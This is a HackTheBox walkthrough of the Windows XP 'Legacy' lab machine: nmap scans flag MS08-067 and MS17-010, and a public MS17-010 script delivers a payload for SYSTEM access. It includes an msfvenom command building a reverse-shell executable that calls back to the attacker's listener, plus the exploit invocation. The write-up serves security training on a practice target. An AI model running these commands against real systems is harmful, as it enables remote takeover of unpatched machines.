---
title: Legacy Machine HackTheBox 
author: pwnd_root
date: 2020-07-09 00:30:00 +0530
excerpt: A windows host from HackTheBox, owned by exploiting SMB vulnerability, without metasploit.
thumbnail: /assets/img/posts/legacy/info.png
categories: [HackTheBox, Machine]
tags: [htb, samba, without metasploit, MS17-010, windows]
---
*[Image: Info Card]*

## Methodology
1. Port Enumeration
2. Samba version enumeration
3. Manual exploit
4. SYSTEM access to target

## Port Enumeration
The nmap port scan had identified 2 open ports- netbios-ssn (139) and microsoft-ds (445), running SMB services.
The vulnerability script scan had identified the vulnerabilities **MS08-067** and **MS17-010** from the Microsoft 
Security Bulletin.  
``` 
[pwnd_root@manjaro Legacy]$ targetRecon 10.10.10.4
[+] Open Ports Scan
        139     netbios-ssn
        445     microsoft-ds
[+] Scripts Scan
                 nmap -sV -sC --script=vuln -p 139 10.10.10.4

Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-08 19:52 IST
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.10.10.4 (10.10.10.4)
Host is up (0.36s latency).

PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Microsoft Windows netbios-ssn
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1                                                                                                 
|        servers (ms17-010).                                                                                                                                                     
|                                                                                                                                                                                
|     Disclosure date: 2017-03-14                                                                                                                                                
|     References:                                                                                                                                                                
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx                                                                                                       
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/                                                                            
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143                                                                                                             

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                   
Nmap done: 1 IP address (1 host up) scanned in 54.69 seconds                                                                                                                     

                 nmap -sV -sC --script=vuln -p 445 10.10.10.4

Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-08 19:53 IST                                                                                                                  
Pre-scan script results:                                                                                                                                                         
| broadcast-avahi-dos:                                                                                                                                                           
|   Discovered hosts:                                                                                                                                                            
|     224.0.0.251                                                                                                                                                                
|   After NULL UDP avahi packet DoS (CVE-2011-1002).                                                                                                                             
|_  Hosts are all up (not vulnerable).                                                                                                                                           
Nmap scan report for 10.10.10.4 (10.10.10.4)                                                                                                                                     
Host is up (0.34s latency).                                                                                                                                                      

PORT    STATE SERVICE      VERSION                                                                                                                                               
445/tcp open  microsoft-ds Microsoft Windows XP microsoft-ds                                                                                                                     
|_clamav-exec: ERROR: Script execution failed (use -d to debug)                                                                                                                  
Service Info: OS: Windows XP; CPE: cpe:/o:microsoft:windows_xp                                                                                                                   

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.58 seconds

[+] Summary 
139     netbios-ssn     Microsoft Windows netbios-ssn N/A
Vulnerabilities
['smb-vuln-ms08-067', 'smb-vuln-ms17-010']

445     microsoft-ds    Microsoft Windows XP microsoft-ds N/A
Vulnerabilities
['smb-vuln-ms08-067', 'smb-vuln-ms17-010']
```
## Manual Exploit
The exploits from exploit-db for **MS17-010** did not work as expected. With the intention of avoiding metasploit module, 
after googling for a while a working
 manual exploit named [send_and_execute.py](https://github.com/helviojunior/MS17-010) was found. 
 > Note: The exploit requires **Impacket** and **mysmb.py** in order to work.

## SYSTEM access
As per the source code, the exploit takes two mandatory arguments, *target IP* and the *executable* that gets executed on the
target as *SYSTEM* user. A windows reverse shell as an executable was generated with *msfvenom* as follows.
``` 
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.16 LPORT=9090 EXITFUNC=thread -f exe -a x86 --platform windows -o legacy.exe
No encoder or badchars specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: legacy.exe
```
Post generating the reverse shell, a netcat listener on port 9090 was started on the attacking machine. The exploit was 
executed as ```python2.7 send_and_execute.py 10.10.10.4 legacy.exe```
After successful execution of the exploit, a reverse shell was captured on the netcat listener.

*[Image: User Shell]*

*[Image: SYSTEM Shell]*

> Being an old Windows XP OS, the target did not have *whoami* binary installed. One method of finding out the current 
user is to upload a *32-bit whoami executable* to the target and use it. However the easiest way to check if we have
*Administrator* access, is by checking if **root.txt** from *C:\Documents and Settings\Administrator\Desktop* is readable.